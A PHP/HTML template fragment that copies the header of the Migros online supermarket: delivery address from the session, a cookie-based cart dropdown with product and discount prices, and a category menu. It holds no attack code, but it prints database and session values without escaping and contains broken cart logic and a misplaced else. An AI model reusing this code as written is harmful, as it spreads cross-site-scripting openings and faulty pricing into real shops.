                                          <span _ngcontent-tus-c348="" class="ng-star-inserted"><?=$_SESSION['sehir']?>, <?=$_SESSION['ilce']?>, <?=$_SESSION['mahalle']?> Mh.</span><!----><!---->
                                       </div>
                                       <fa-icon _ngcontent-tus-c348="" class="ng-fa-icon">
                                          <svg role="img" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="chevron-down" class="svg-inline--fa fa-chevron-down" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
                                             <path fill="currentColor" d="M233.4 406.6c12.5 12.5 32.8 12.5 45.3 0l192-192c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L256 338.7 86.6 169.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l192 192z"></path>
                                          </svg>
                                       </fa-icon>
                                    </div>
                                    <div _ngcontent-tus-c348="" class="delivery-row ng-star-inserted" onclick="openmodal('zaman')">
                                       <div _ngcontent-tus-c348="" id="closest-time" class="closest-time ng-star-inserted">
                                          <div _ngcontent-tus-c348="" id="delivery-inner-text" class="delivery-options-inner-text mat-caption-normal">En Yakın Teslimat</div>
                                          <div _ngcontent-tus-c348="" id="delivery-inner-time" class="delivery-options-inner-time mat-caption">
                                          <?php
                                          header('Content-Type: text/html; charset=utf-8');

                                          setlocale(LC_TIME, 'tr_TR.UTF-8', 'tr_TR', 'tr', 'turkish');
                                          $bugun = new DateTime('now');
                                          $sonrakiGun = clone $bugun;
                                          $sonrakiGun->modify('+1 day');
                                          $sonrakiGunAdi = strftime('%A', $sonrakiGun->getTimestamp());
                                          echo $sonrakiGunAdi;
                                          ?>
                                          08:00 - 22:00 </div>
                                       </div>
                                       <fa-icon _ngcontent-tus-c348="" class="ng-fa-icon ng-star-inserted">
                                          <svg role="img" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="chevron-down" class="svg-inline--fa fa-chevron-down" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
                                             <path fill="currentColor" d="M233.4 406.6c12.5 12.5 32.8 12.5 45.3 0l192-192c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L256 338.7 86.6 169.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l192 192z"></path>
                                          </svg>
                                       </fa-icon>
                                       <!---->
                                    </div>
                                    <!---->
                                 </div>
                              </div>
                              <!----><!----><!----><!----><!---->
                           </div>
                        </button>
                        <?php
                        } else {
                        ?>
                     </sm-header-address-delivery-time>
                     <sm-header-address-delivery-time _nghost-cro-c348="" onclick="openmodal('sepet')">
                        <button _ngcontent-cro-c348="" id="delivery-options-search-bucket" class="delivery-options-search-bucket-wrapper">
                           <div _ngcontent-cro-c348="" class="delivery-options-wrapper">
                              <div _ngcontent-cro-c348="" class="choose-address-container">
                                 <div _ngcontent-cro-c348="" class="choose-address">
                                    <fa-icon _ngcontent-cro-c348="" class="ng-fa-icon">
                                       <svg role="img" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="location-dot" class="svg-inline--fa fa-location-dot" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512">
                                          <path fill="currentColor" d="M215.7 499.2C267 435 384 279.4 384 192C384 86 298 0 192 0S0 86 0 192c0 87.4 117 243 168.3 307.2c12.3 15.3 35.1 15.3 47.4 0zM192 256c-35.3 0-64-28.7-64-64s28.7-64 64-64s64 28.7 64 64s-28.7 64-64 64z"></path>
                                       </svg>
                                    </fa-icon>
                                    <div _ngcontent-cro-c348="" class="delivery-options-inner-text mat-caption">Teslimat Adresi Seçin</div>
                                 </div>
                                 <fa-icon _ngcontent-cro-c348="" class="ng-fa-icon">
                                    <svg role="img" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="chevron-down" class="svg-inline--fa fa-chevron-down" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
                                       <path fill="currentColor" d="M233.4 406.6c12.5 12.5 32.8 12.5 45.3 0l192-192c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L256 338.7 86.6 169.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l192 192z"></path>
                                    </svg>
                                 </fa-icon>
                              </div>
                              <!----><!----><!---->
                           </div>
                        </button>
                        <!----><!----><!----><!---->
                     </sm-header-address-delivery-time>
                     <?php
                        }
                        ?>
                     <div class="search-wrapper">
                        <fe-product-search-combobox role="searchbox" _nghost-cro-c273="">
                           <div _ngcontent-cro-c273="" class="migros">
                              <input _ngcontent-cro-c273="" id="product-search-combobox--trigger" type="text" role="combobox" class="mat-autocomplete-trigger subtitle-2 ng-untouched ng-pristine ng-valid" placeholder="Ara" autocomplete="off" aria-autocomplete="list" aria-expanded="false" aria-haspopup="listbox"><!---->
                              <div _ngcontent-cro-c273="" id="product-search-combobox-search-right-button" class="migros-search-right-button subtitle-2"> Ara </div>
                              <!---->
                              <mat-autocomplete _ngcontent-cro-c273="" id="product-search-combobox--panel" showpanel="false" class="">
                                 <!---->
                              </mat-autocomplete>
                           </div>
                        </fe-product-search-combobox>
                        <!---->
                     </div>
                     <sm-cart-dropdown _nghost-cro-c342="">
                        <div _ngcontent-cro-c342="">
                           <div _ngcontent-cro-c342="" id="homepage-cart-button" class="toggle-layer"
                           <?php
                              foreach ($_COOKIE as $cookieName => $cookieValue) {
                                 if (strpos($cookieName, 'cart_item_') !== false) {
                                    $id = substr($cookieName, strlen('cart_item_'));
                                 }}
                                    if (!empty($id)) {
                                    
                              ?>
                           
                           
                           onmouseover="showCart()" onmouseout="hideCart()"
                           <?php } 
                                 
                              else{?>
                              onmouseover="showCart2()" onmouseout="hideCart2()"
                              <?php }
                                 
                              ?>
                           ></div>
                           <div _ngcontent-cro-c342="" feclickelsewhere="" 
                           
                           <?php
                              foreach ($_COOKIE as $cookieName => $cookieValue) {
                                 if (strpos($cookieName, 'cart_item_') !== false) {
                                    $id = substr($cookieName, strlen('cart_item_'));

                                    if (!empty($id)) {
                                    
                              ?>
                           
                           
                           onmouseover="showCart()" onmouseout="hideCart()"
                           <?php } }
                                 
                              else{?>
                              onmouseover="showCart2()" onmouseout="hideCart2()"
                              <?php }
                                 }
                              ?>
                            class="dropdown-btn">
                              <div _ngcontent-cro-c342="" class="icon-cart-quantity-wrapper">
                                 <div _ngcontent-cro-c342="" class="icon-cart"></div>
                                 <div _ngcontent-cro-c342="" class="quantity">0</div>
                              </div>
                              <div _ngcontent-cro-c342="">
                                 <div _ngcontent-cro-c342="" class="subtitle-2 text-color-black">Sepetim</div>
                                 <div _ngcontent-cro-c342="" class="mat-caption price">0,00 TL</div>
                              </div>
                              <fa-icon _ngcontent-cro-c342="" class="ng-fa-icon text-color-black">
                                 <svg role="img" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="chevron-down" class="svg-inline--fa fa-chevron-down" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
                                    <path fill="currentColor" d="M233.4 406.6c12.5 12.5 32.8 12.5 45.3 0l192-192c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L256 338.7 86.6 169.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l192 192z"></path>
                                 </svg>
                              </fa-icon>
                              

                              <sm-cart-dropdown-list _ngcontent-nog-c343="" id="cart" class="empty-cart2 hidden" _nghost-nog-c342="" onmouseover="showCart2()" onmouseout="hideCart2()">
                                 <div _ngcontent-nog-c342="" class="cart-dropdown-wrapper">

                                 <?php
                                 $id = array();

                                 foreach ($_COOKIE as $cookieName => $cookieValue) {
                                    if (strpos($cookieName, 'cart_item_') !== false) {
                                       $ids = substr($cookieName, strlen('cart_item_'));
                                       $id[] = $ids;
                                    }
                              }
                                 if (!empty($id)) {
                                    $sql = "SELECT * FROM urunler WHERE id IN (" . implode(',', array_fill(0, count($id), '?')) . ")";
                                    $stmt = $pdo->prepare($sql);
                                    for ($i = 0; $i < count($id); $i++) {
                                       $stmt->bindParam($i + 1, $id[$i]);
                                    }
                                    $stmt->execute();
                                    $urunler = $stmt->fetchAll(PDO::FETCH_ASSOC);

                                    $urun_fiyat = 0;
                                    foreach ($urunler as $urun) {
                                       $adet = intval($_COOKIE["cart_item_".strval($urun["id"])]);
                                       if($urun['urun_indirim'] != 0){
                                          $orijinal_fiyat = $urun['urun_fiyat'];
                                          $indirim_orani = $urun['urun_indirim'];
                                          $urun_fiyat = (($orijinal_fiyat - ($orijinal_fiyat * ($indirim_orani / 100))) * $adet);
                                       }else {
                                          $urun_fiyat += ($urun["urun_fiyat"] * $adet);
                                       }
                                       
                                    ?>
                                    <sm-cart-dropdown-item _ngcontent-nog-c342="" _nghost-nog-c341="">
                                       <div _ngcontent-nog-c341="" class="cart-dropdown-item">
                                          <fe-product-image _ngcontent-nog-c341="" _nghost-nog-c159="">
                                             <a _ngcontent-nog-c159="" id="product-image-link" href="/urun/<?=seo($urun['urun_adi'])?>/<?=seo($urun['id'])?>">
                                                <img _ngcontent-nog-c159="" felazyload="" alt="<?=$urun['urun_adi']?>" src="<?=$urun['urun_resim']?>"><!----><!---->
                                             </a>
                                          </fe-product-image>
                                          <!---->
                                          <div _ngcontent-nog-c341="" class="detail-wrapper">
                                             <div _ngcontent-nog-c341="" class="name-delete-wrapper">
                                                <fe-product-name _ngcontent-nog-c341="" _nghost-nog-c160="">
                                                   <h1 _ngcontent-nog-c160="">
                                                      <a _ngcontent-nog-c160="" class="migros" src="<?=$urun['urun_resim']?>"> <?=$urun['urun_adi']?> </a><!----><!---->
                                                   </h1>
                                                </fe-product-name>
                                                <fa-icon _ngcontent-nog-c341="" id="cart-dropdown-delete-button" class="ng-fa-icon delete-button">
                                                   <svg role="img" aria-hidden="true" focusable="false" data-prefix="far" data-icon="trash-can" class="svg-inline--fa fa-trash-can" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512">
                                                      <path fill="currentColor" d="M160 400C160 408.8 152.8 416 144 416C135.2 416 128 408.8 128 400V192C128 183.2 135.2 176 144 176C152.8 176 160 183.2 160 192V400zM240 400C240 408.8 232.8 416 224 416C215.2 416 208 408.8 208 400V192C208 183.2 215.2 176 224 176C232.8 176 240 183.2 240 192V400zM320 400C320 408.8 312.8 416 304 416C295.2 416 288 408.8 288 400V192C288 183.2 295.2 176 304 176C312.8 176 320 183.2 320 192V400zM317.5 24.94L354.2 80H424C437.3 80 448 90.75 448 104C448 117.3 437.3 128 424 128H416V432C416 476.2 380.2 512 336 512H112C67.82 512 32 476.2 32 432V128H24C10.75 128 0 117.3 0 104C0 90.75 10.75 80 24 80H93.82L130.5 24.94C140.9 9.357 158.4 0 177.1 0H270.9C289.6 0 307.1 9.358 317.5 24.94H317.5zM151.5 80H296.5L277.5 51.56C276 49.34 273.5 48 270.9 48H177.1C174.5 48 171.1 49.34 170.5 51.56L151.5 80zM80 432C80 449.7 94.33 464 112 464H336C353.7 464 368 449.7 368 432V128H80V432z"></path>
                                                   </svg>
                                                </fa-icon>
                                             </div>
                                              <?php 
                                    if($urun['urun_indirim'] != 0){?>
                                    
                                             <fe-product-labels _ngcontent-nog-c341="" _nghost-nog-c295="">
                                                <div _ngcontent-nog-c295="" class="product-labels">
                                                   <div _ngcontent-nog-c295="" class="price product-label"><span _ngcontent-nog-c295="">İndirimli Ürün</span></div>
                                                   <!----><!---->
                                                   <fe-crm-discount-badge _ngcontent-nog-c295="" _nghost-nog-c293="">
                                                      <!---->
                                                   </fe-crm-discount-badge>
                                                </div>
                                                <!---->
                                             </fe-product-labels>
                                              <?php } ?>
                                             <div _ngcontent-nog-c341="" class="actions-price-wrapper">
                                                <sm-product-actions _ngcontent-nog-c341="" _nghost-nog-c292="">
                                                   <div _ngcontent-nog-c292="" class="product-actions">
                                                      <button onclick="uruneksi('<?=strval($urun['id'])?>')" _ngcontent-nog-c292="" class="product-decrease" id="product-actions-product-decrease--goldstar-mini-boy-celik-caydanlik-304-p-1e8bd53" no-pointer-event="true">
                                                      <fa-icon _ngcontent-ssk-c292="" class="ng-fa-icon ng-star-inserted">
                                                         <?php   
                                                      if ($adet > 1){
                                                         echo '<svg role="img" aria-hidden="true" focusable="false" data-prefix="far" data-icon="minus" class="svg-inline--fa fa-minus" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M432 256C432 269.3 421.3 280 408 280H40c-13.25 0-24-10.74-24-23.99C16 242.8 26.75 232 40 232h368C421.3 232 432 242.8 432 256z"></path></svg>';
                                                      }else{
                                                         echo '<svg role="img" aria-hidden="true" focusable="false" data-prefix="far" data-icon="trash-can" class="svg-inline--fa fa-trash-can" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M160 400C160 408.8 152.8 416 144 416C135.2 416 128 408.8 128 400V192C128 183.2 135.2 176 144 176C152.8 176 160 183.2 160 192V400zM240 400C240 408.8 232.8 416 224 416C215.2 416 208 408.8 208 400V192C208 183.2 215.2 176 224 176C232.8 176 240 183.2 240 192V400zM320 400C320 408.8 312.8 416 304 416C295.2 416 288 408.8 288 400V192C288 183.2 295.2 176 304 176C312.8 176 320 183.2 320 192V400zM317.5 24.94L354.2 80H424C437.3 80 448 90.75 448 104C448 117.3 437.3 128 424 128H416V432C416 476.2 380.2 512 336 512H112C67.82 512 32 476.2 32 432V128H24C10.75 128 0 117.3 0 104C0 90.75 10.75 80 24 80H93.82L130.5 24.94C140.9 9.357 158.4 0 177.1 0H270.9C289.6 0 307.1 9.358 317.5 24.94H317.5zM151.5 80H296.5L277.5 51.56C276 49.34 273.5 48 270.9 48H177.1C174.5 48 171.1 49.34 170.5 51.56L151.5 80zM80 432C80 449.7 94.33 464 112 464H336C353.7 464 368 449.7 368 432V128H80V432z"></path></svg>';
                                                      }
                                                      ?>
                                                      </fa-icon>
                                                         <!----><!---->
                                                      </button>
                                                      <div _ngcontent-nog-c292="" id="product-amount" class="product-amount"><span _ngcontent-nog-c292="" class="amount mat-caption">1</span><span _ngcontent-nog-c292="" class="unit text-color-grey">adet</span></div>
                                                      <button onclick="urunekleee('<?=strval($urun['id'])?>')" _ngcontent-nog-c292="" aria-label="Sepetteki ürün sayısını arttır" class="product-increase" id="product-actions-product-increase--goldstar-mini-boy-celik-caydanlik-304-p-1e8bd53">
                                                         <fa-icon _ngcontent-nog-c292="" class="ng-fa-icon">
                                                            <svg role="img" aria-hidden="true" focusable="false" data-prefix="far" data-icon="plus" class="svg-inline--fa fa-plus" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512">
                                                               <path fill="currentColor" d="M432 256C432 269.3 421.3 280 408 280h-160v160c0 13.25-10.75 24.01-24 24.01S200 453.3 200 440v-160h-160c-13.25 0-24-10.74-24-23.99C16 242.8 26.75 232 40 232h160v-160c0-13.25 10.75-23.99 24-23.99S248 58.75 248 72v160h160C421.3 232 432 242.8 432 256z"></path>
                                                            </svg>
                                                         </fa-icon>
                                                      </button>
                                                   </div>
                                                   <!----><!----><!---->
                                                </sm-product-actions>
                                                <?php 
                                                if($urun['urun_indirim'] != 0){?>
                                                <fe-product-price _ngcontent-nog-c341="" _nghost-nog-c271="">
                                                   <div _ngcontent-nog-c271="" class="promotion-wrapper">
                                                      <div _ngcontent-nog-c271="" id="price-old" class="price-old"><span _ngcontent-nog-c271="" id="old-amount" class="amount"><?=$urun['urun_fiyat']?> <span _ngcontent-nog-c271="" class="currency">TL</span></span></div>
                                                      <!---->
                                                      <div _ngcontent-nog-c271="" id="price-new" class="price-new subtitle-1"><span _ngcontent-nog-c271="" id="new-amount" class="amount">
                                                      <?php
                                                      $orijinal_fiyat = $urun['urun_fiyat'];
                                                      $indirim_orani = $urun['urun_indirim'];
                                                      $indirimli_fiyat = $orijinal_fiyat - ($orijinal_fiyat * ($indirim_orani / 100));
                                                      echo $indirimli_fiyat;
                                                      ?>  
                                                       <span _ngcontent-nog-c271="" class="currency">TL</span></span></div>
                                                   </div>
                                                   <!---->
                                                </fe-product-price>
                                                <?php }else{?>
                                                 <fe-product-price _ngcontent-nog-c341="" _nghost-nog-c271="">
                                                   <div _ngcontent-nog-c271="" class="">
                                                      
                                                      <div _ngcontent-nog-c271="" id="price-new" class="price-new subtitle-1 price-new-only"><span _ngcontent-nog-c271="" id="new-amount" class="amount">
                                                      <?=$urun['urun_fiyat']?>
                                                       <span _ngcontent-nog-c271="" class="currency">TL</span></span></div>
                                                   </div>
                                                   <!---->
                                                </fe-product-price>
                                                <?php }?> 
                                             </div>
                                          </div>
                                       </div>
                                    </sm-cart-dropdown-item>
                                    <!---->
                                    <div _ngcontent-nog-c342="" class="minimum-amount-basket-wrapper">
                                       <!----><button _ngcontent-nog-c342="" class="subtitle-2">Sepete Git</button>
                                    </div>
                                 </div>
                              </sm-cart-dropdown-list>
                              <?php } }
                              else{?>
                              <span _ngcontent-svk-c342="" id="cart" class="empty-cart mat-body-2 hidden">Sepetiniz Henüz Boş</span>
                              <?php }
                                 
                              ?>
                           </div>
                        </div>
                     </sm-cart-dropdown>
                     
                     <!---->
                  </div>
                  <!---->
                  <div class="header-bottom">
                     <div class="tabs">
                        <div class="tab mat-caption text-color-black" onmouseover="showCategory()" onmouseout="hideCategory()">
                           <div class="categories-icon electronic"><span>KATEGORİLER</span></div>
                           <!---->
                        </div>
                        <!---->
                        <a id="header-campaign" class="tab mat-caption text-color-black campaings" href="/kampanyalar">
                           KAMPANYALAR <!---->
                        </a>
                        <a id="header-migroskop" class="tab mat-caption text-color-black" href="/migroskop-urunleri-l-8d0bf81">
                           MİGROSKOP <!---->
                        </a>
                        <!----><!---->
                        <a hidden="" routerlink="/migros-sanal-markete-ozel-sansli-saatler-l-33d2357" id="header-lucky-hours" class="tab mat-caption text-color-black" href="/migros-sanal-markete-ozel-sansli-saatler-l-33d2357">
                           ŞANSLI SAATLER <!---->
                        </a>
                        <!---->
                        <a routerlink="/gordugunuze-inanin-dt-2" hidden="" id="header-gor-inan" class="tab mat-caption text-color-black" href="/gordugunuze-inanin-dt-2">
                           GÖR İNAN <!---->
                        </a>
                        <a routerlink="/hazir-sepet" class="tab mat-caption text-color-black fast-cart-tab" hidden="" href="/hazir-sepet">
                           <div class="fast-cart-tab-wrapper">
                              <div class="icon-fast-cart-quantity-wrapper">
                                 <img src="/assets/icons/fast-cart-black.png" alt="Hazır Sepet" class="icon-fast-cart">
                                 <div class="quantity">0</div>
                              </div>
                              <span>HAZIR SEPET</span><!---->
                           </div>
                        </a>
                        <div class="categories-sub-categories-wrapper ng-star-inserted hidden" id="categoryai" onmouseover="showCategory()" onmouseout="hideCategory()">
                           <div class="categories-wrapper">
                              <a class="categories mat-caption-normal text-color-black discount-products ng-star-inserted" id="header-categories--tum-indirimli-urunler-dt-0" href="/urunler/indirimli-urunler">
                                 Tüm İndirimli Ürünler 
                                 <div class="hover-arrow"></div>
                              </a>
                              <?php
                            $sql = "SELECT * FROM kategoriler";

                            $stmt = $pdo->prepare($sql);
                            $stmt->execute();

                            $kategoriler = $stmt->fetchAll(PDO::FETCH_ASSOC);

                            foreach ($kategoriler as $kategori) {?>
                              <a class="categories mat-caption-normal text-color-black ng-star-inserted" id="header-categories--telefon-ve-aksesuarlari-c-525" href="/urunler/<?=seo($kategori['kategori_adi'])?>/<?=seo($kategori['id'])?>">
                                 <?=$kategori['kategori_adi']?>
                                 <div class="hover-arrow"></div>
                              </a>
                             <?php }?> 
                              <!---->
                           </div>
                           <div class="sub-categories-wrapper">
                              <!---->
                           </div>
                        </div>
                        <!---->
                     </div>
                     <!---->
                  </div>
                  <!---->
               </div>
               <!---->
            </sm-header>
            <!----><!----><!----><!----><!---->